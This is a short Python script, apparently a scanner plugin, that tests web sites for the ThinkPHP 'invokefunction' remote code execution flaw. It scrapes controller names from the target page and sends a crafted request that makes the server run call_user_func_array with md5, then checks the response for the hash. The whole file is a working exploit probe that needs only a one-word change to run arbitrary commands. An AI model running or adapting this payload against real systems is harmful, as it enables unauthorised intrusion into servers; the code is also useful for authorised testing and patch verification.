"""  
@Time: 2024/2/28 16:20 
@Auth: Y5neKO
@File: Thinkphp_invoke_func_code_exec.py 
@IDE: PyCharm 
"""
import re
import urllib
import requests


def run(url, timeout):
    result = {
        'name': 'Thinkphp_invoke_func_code_exec',
        'vulnerable': False,
        'method': None,
        'url': None,
        'payload': None
    }
    headers = {
        "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    }
    controllers = []
    try:
        req = requests.get(url, headers=headers, timeout=15, verify=False)
    except:
        return result

    pattern = '<a[\\s+]href="/[A-Za-z]+'
    matches = re.findall(pattern, req.text)
    for match in matches:
        controllers.append(match.split('/')[1])
    controllers.append('index')
    controllers = list(set(controllers))

    for controller in controllers:
        try:
            payload = f'index.php?s={controller}/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=2333'
            vurl = urllib.parse.urljoin(url, payload)
            req = requests.get(vurl, headers=headers, timeout=15, verify=False)
            if "56540676a129760a3" in req.text:
                result['vulnerable'] = True
                result['method'] = 'GET'
                result['url'] = url
                result['payload'] = vurl
                return result  # This should be outside the loop if you want to test all controllers

        except:
            pass  # It's better to handle specific exceptions and possibly log them

    return result  # Return the result after trying all controllers
